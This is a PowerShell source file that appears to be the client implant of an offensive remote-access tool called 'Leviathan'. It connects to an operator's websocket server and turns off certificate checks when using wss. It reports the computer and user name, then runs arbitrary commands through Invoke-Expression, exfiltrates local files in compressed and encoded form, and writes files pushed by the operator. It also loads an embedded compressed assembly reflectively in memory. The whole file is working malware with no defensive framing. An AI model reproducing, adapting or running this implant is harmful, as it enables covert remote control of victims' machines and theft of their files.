function Start-LeviathanClient {
    <##>
    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [ValidatePattern('^(ws|wss)://')]
        [string]$endpoint,

        [parameter(Mandatory=$false)]
        [ValidateNotNullOrEmpty()]
        [int]$DelayCheckin = 0
    )

    $ErrorActionPreference = "SilentlyContinue"
    #We need to use the Activator class to create a websocket for v2.0 compliance
    try {
        Write-Verbose "[+] Creating the client"
        $client = [Activator]::CreateInstance([WebSocket4Net.WebSocket], @($endpoint))
    }
    catch {
        Write-Verbose "[+] Unable to create the client. Exiting...."
        break
    }

    if ($endpoint.StartsWith('wss://')) {
        #no certificate validation if using secure websockets
        Write-Verbose "[+] Allowing untrusted certificates because secure websockets is being used"
        $client.AllowUntrustedCertificate = $true
    }

    #Register all the events we need to send and receive data from the server 
    Write-Verbose "[+] Registering events for the client"
    $null = Register-ObjectEvent -InputObject $client -EventName MessageReceived -Action {New-Event -SourceIdentifier 'TaskReceived' -MessageData $($event.sourceEventArgs.Message)}
    $null = Register-ObjectEvent -InputObject $client -EventName Closed -Action {New-Event -SourceIdentifier 'ConnectionClosed' -MessageData $true}

    Write-Verbose "[+] Attempting to connect to server"
    $client.Open()
    Start-Sleep -Seconds 3
    #Wait for the handshake to complete
    if ($client.State -ne [WebSocket4Net.WebSocketState]::Open) {
        Write-Verbose "[+] Failed to connect to server. Exiting ..."
        break
    }

    #Send the checkin 
    $checkin = "$env:COMPUTERNAME|$env:USERNAME"
    Start-Sleep -Seconds $DelayCheckin
    $client.Send($checkin)
    Write-Verbose "[+] Sent checkin to server"

    Write-Verbose "[+] Waiting for tasking"

    while ($client.State -ne [WebSocket4Net.WebSocketState]::Closed) {
        $encTask = (Wait-Event -SourceIdentifier 'TaskReceived').MessageData
        $rawTask = [Convert]::FromBase64String($encTask)
        #Get the task ID
        $TaskID = $rawTask[0]
        Write-Verbose "[+] Received Task from server $taskID"
        $ResultData = @()
        switch ($TaskID) {
            #Execute Cmd
            0 {
                $cmd = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
                if ($cmd -match '^cd') {
                    $cmdargs = $cmd.split('cd')[-1]
                    try {
                        $cmdargs = $cmdargs.trim("`"").trim("'").trim()
                        cd "$cmdargs"
                        $result = $pwd
                    }
                    catch [System.Management.Automation.ActionPreferenceStopException] {
                        $result = "Error: $_ (or cannot be accessed)."
                    }   
                }
                else {
                    try {
                        $result = Invoke-Expression -Command "$cmd -ErrorAction Stop | Out-String"
                    }
                    catch [System.Management.Automation.ActionPreferenceStopException] {
                        $result = "Error: $_ (or cannot be accessed)."
                    }
                }

                $ResultData += [BitConverter]::GetBytes(0) + [Text.Encoding]::ASCII.GetBytes("|$result") 
            }
            #Download File
            1 {
                try {
                    Write-Verbose "Received Download task"
                    $filePath = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
                    $filePath = (Resolve-Path -Path $filePath).Path
                    $fileName = Split-Path -Path $filePath -Leaf
                    Write-Verbose "uploading file $filePath"
                    $rawData = [System.IO.File]::ReadAllBytes($filePath)
                    # Taken from powersploit
                    $CompressedStream = New-Object IO.MemoryStream
                    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
                    $DeflateStream.Write($rawData, 0, $rawData.Length)
                    $DeflateStream.Dispose()
                    $CompressedFileBytes = $CompressedStream.ToArray()
                    $CompressedStream.Dispose()
                    $fileData = [Convert]::ToBase64String($CompressedFileBytes)
                    $ResultData += [BitConverter]::GetBytes(1) + [Text.Encoding]::ASCII.GetBytes("|$fileData|$fileName")
                }
                catch {
                    $ResultData += [BitConverter]::GetBytes(4) + [Text.Encoding]::ASCII.GetBytes("|$_")
                }
            }
            #File upload
            2 {
                try {
                    Write-Verbose "Received upload task"
                    $dataString = [Text.Encoding]::ASCII.GetString($rawTask[2..$rawTask.Length])
                    $encData = $dataString.split('|')[0]
                    $fileName = $dataString.split('|')[1]
                    Write-Verbose "Downloading file from server"
                    Set-Content -Path $fileName -Value $([Convert]::FromBase64String($encData)) -Encoding Byte
                    $ResultData += [BitConverter]::GetBytes(2) + [Text.Encoding]::ASCII.GetBytes("|File upload successful")
                }
                catch {
                    $ResultData += [BitConverter]::GetBytes(2) + [Text.Encoding]::ASCII.GetBytes("|$_")
                }
            }
            3 {
                Get-Event -SourceIdentifier "TaskReceived" | Remove-Event
                Get-EventSubscriber | Unregister-Event
                $script:client.close()
            }
            Default {$ResultData += [BitConverter]::GetBytes(4)}
        }
        Write-Verbose "[+] Sending task result data to server"
        $encData = [Convert]::ToBase64String($ResultData)
        $client.Send($encData)
        Get-Event -SourceIdentifier "TaskReceived" | Remove-Event
    }

    #Cleanup Events and subscriptions
    Get-Event -SourceIdentifier "TaskReceived" | Remove-Event
    Get-Event -SourceIdentifier "ConnectionClosed" | Remove-Event

    Get-EventSubscriber | Unregister-Event
}

#https://websocket4net.codeplex.com/releases/view/617508
$EncodedCompressedFile = @'

'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
$UncompressedFileBytes = New-Object Byte[](94208)
$null = $DeflatedStream.Read($UncompressedFileBytes, 0, 94208) | Out-Null
$null = [Reflection.Assembly]::Load($UncompressedFileBytes)